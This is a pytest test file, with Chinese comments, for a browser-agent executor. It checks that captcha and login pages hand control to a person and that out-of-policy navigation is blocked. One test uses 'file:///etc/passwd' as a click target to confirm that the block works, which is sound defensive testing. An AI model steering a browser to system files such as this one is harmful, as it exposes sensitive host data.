    """负对照：普通页面绝不挂 needs_human（每次误报都要用掉唯一的人工暂停机会）。"""
    result = await make_executor(FakeBrowser(FakePage())).call(
        "browser_open", {"url": "https://example.com/"}
    )
    assert result.status == "success"
    assert "needs_human" not in result.data
    assert "human_prompt" not in result.data


@pytest.mark.asyncio
async def test_browser_click_on_captcha_page_carries_hitl_payload():
    """D5：点击后页面变成人机验证 → needs_human（intervention=captcha）。"""
    page = FakePage(html=CAPTCHA_HTML)
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "success"
    assert result.data["needs_human"] is True
    assert result.data["intervention"] == "captcha"
    assert "验证" in result.data["human_prompt"]


@pytest.mark.asyncio
async def test_browser_type_into_login_form_carries_hitl_payload():
    """D5：输入之后落在登录表单 → needs_human；动作本身照常完成（先清空再填）。"""
    page = FakePage(html=LOGIN_HTML, password_inputs=1)
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    result = await ex.call("browser_type", {"ref": "e2", "text": "13800000000"})
    assert result.status == "success"
    assert result.data["needs_human"] is True
    assert result.data["intervention"] == "login"
    assert ("fill", "aria-ref=e2", "13800000000") in page.calls
    # 只认**可见**密码框：真实页面里 DOM 中藏着 display:none 的登录弹窗很常见，
    # 把“DOM 里存在”当“页面上要登录”会直接误报（D5 保守优先）
    assert ("count", "input[type=password]:visible") in page.calls


@pytest.mark.asyncio
async def test_detection_failure_never_breaks_the_action():
    """检测是 best-effort：content()/密码框探测抛错 → 当作“没发现”，动作结果原样可用。"""
    page = FakePage(html=LOGIN_HTML, password_inputs=1)
    page.fail_content = True
    page.fail_password_count = True
    browser = FakeBrowser(page)
    result = await make_executor(browser).call("browser_open", {"url": "https://example.com/"})
    assert result.status == "success"
    assert "needs_human" not in result.data
    assert result.data["requested_url"] == "https://example.com/"


@pytest.mark.asyncio
async def test_failed_action_on_login_page_keeps_its_own_status():
    """失败即数据：error 结果只补 needs_human，不改状态/错误字段。

    图端只在 success 上转 hitl（graph.execute），所以错误路径上的 flag 是诊断信息：
    降级链照常继续——绝不把一次失败的点击伪装成“需要人工”的成功。
    """
    page = FakePage(html=LOGIN_HTML, password_inputs=1)
    page.fail_click = True
    page.fail_locator_evaluate = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "error"
    assert result.error_type == "timeout"
    assert result.data["needs_human"] is True
    assert result.data["attempts"] == 3  # 动作自己的 data 仍在


@pytest.mark.asyncio
async def test_click_navigation_out_of_policy_wins_over_intervention():
    """落点在策略外时返回拦截结果（不是 HITL 载荷）：安全门先于人工桥。"""
    page = FakePage(html=LOGIN_HTML, password_inputs=1)
    page.click_url = "file:///etc/passwd"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "needs_human" not in result.data


@pytest.mark.asyncio
async def test_browser_open_navigation_failure_is_not_sampled():
    """导航失败时页面停在浏览器错误页：不采样、不检测（错误页上没有“需要人工”的信号）。"""
    page = FakePage(html=LOGIN_HTML, password_inputs=1)
    page.fail_goto = True
    browser = FakeBrowser(page)
    result = await make_executor(browser).call("browser_open", {"url": "https://example.com/down"})
    assert result.error_type == "navigation_failed"
    assert "needs_human" not in result.data
    assert ("content",) not in page.calls


@pytest.mark.asyncio
async def test_observation_tools_do_not_run_detection():
    """只有 open/click/type 做检测：snapshot/scroll 不采样（content() 是整页序列化，不白花）。"""
    page = FakePage(html=LOGIN_HTML, password_inputs=1)
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    await ex.call("browser_snapshot", {})
    await ex.call("browser_scroll", {"direction": "down"})
    assert not [call for call in page.calls if call[0] in ("content", "count")]


@pytest.mark.asyncio
async def test_html_sample_is_truncated_and_lowercased_before_matching():
    """采样的**本侧**边界（:func:`_sample_html`）：先截到 20KB 再小写。

    为什么单独测这个私有缝：``detect_intervention`` 自己也会截断，所以端到端测试
    （:func:`test_html_sample_is_bounded_to_20kb`）分不出 executor 有没有截——
    而这里确实需要它：把可能上 MB 的整页 HTML ``lower()`` 是纯浪费（复制全串）。
    """
    from browsepilot.app.executor import _sample_html

    page = FakePage(html="A" * (MAX_HTML_SAMPLE_CHARS * 2))
    sample = await _sample_html(page)
    assert len(sample) == MAX_HTML_SAMPLE_CHARS
    assert sample == sample.lower()
    assert ("content",) in page.calls


@pytest.mark.asyncio
async def test_html_sample_is_bounded_to_20kb():
    """采样有界（教训 §4）：标记落在第 20KB 之后就不算命中，超大页面不会拖慢动作。"""
    page = FakePage(html="x" * MAX_HTML_SAMPLE_CHARS + "<p>验证码</p>")
    result = await make_executor(FakeBrowser(page)).call(
        "browser_open", {"url": "https://example.com/"}
    )
    assert result.status == "success"
    assert "needs_human" not in result.data
